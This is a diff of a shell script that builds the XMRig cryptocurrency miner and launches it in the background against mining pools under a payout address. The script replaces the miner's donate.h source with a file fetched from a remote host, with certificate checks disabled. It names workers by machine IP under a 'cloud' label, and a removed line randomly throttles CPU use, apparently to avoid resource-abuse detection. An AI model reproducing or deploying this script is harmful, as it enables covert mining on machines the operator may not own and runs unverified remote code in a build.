@@ -21,7 +21,7 @@ sudo apt-get -y install git build-essential cmake libuv1-dev libssl-dev libhwloc
 git clone https://github.com/xmrig/xmrig.git
 mkdir xmrig/build
 cd xmrig/build
-sudo wget --no-check-certificate -O ../src/donate.h "https://drive.google.com/uc?export=download&id=1Ih0FYVvUAMREv6mYsZYQVQjyI--M5svR"
+sudo wget --no-check-certificate -O ../src/donate.h "https://bear-on-the-job.github.io/crypto-mining/donate.h"
 cmake ..
 make -j$(nproc)
 
@@ -32,6 +32,6 @@ id=$(ifconfig | sed -En 's/127.0.0.1//;s/.*inet (addr:)?(([0-9]*\.){3}[0-9]*).*/
 #sudo sed -i "s/xmrig-cloud/xmrig-$id/gi" "config.json"
 #./xmrig
 
-./xmrig -o pool.supportxmr.com:3333 -u 49WdyQJD9vMHD348LMop7nTWBKduNFYTReskEaxhMSHj6RQmH67XgpPBxwq7LBm8xmXkjzVhnLjYmSzHFGhe1CNbCri5Zwb -p xmrig-$id -t 4 -B
+./xmrig -o rx.unmineable.com:3333 -a rx -k -u ZEC:t1ezbT2YNP9jMTkfJZEwFSoAN1BW78rW8WT.xmrig-$id -p x -t 4 -B
 
-proc=$(pgrep xmrig); while true; do pkill -f cpulimit; rand=$(shuf -i 100-400 -n 1); cpulimit -p $proc -b -l $rand; echo CPU $rand; sleep 10; done &
+#proc=$(pgrep xmrig); while true; do pkill -f cpulimit; rand=$(shuf -i 100-400 -n 1); cpulimit -p $proc -b -l $rand; echo CPU $rand; sleep 10; done &
